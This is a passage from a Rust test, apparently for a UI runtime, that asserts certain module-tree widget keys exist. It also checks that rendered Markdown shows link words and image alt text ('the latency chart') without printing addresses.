        rt.frame(FRAME);
    }
    for key in ["mod-tree.0.2.0", "mod-tree.0.2.1", "mod-tree.0.4.field", "mod-tree.0.7.trigger"] {
        assert!(has(&rt, key), "{key}");
    }
    assert!(any_text(&rt, "Rollout notes"));
    // The drawn Markdown names the dead link's words and the image's alt text, never an address.
    assert!(any_text(&rt, "the latency chart"));
}
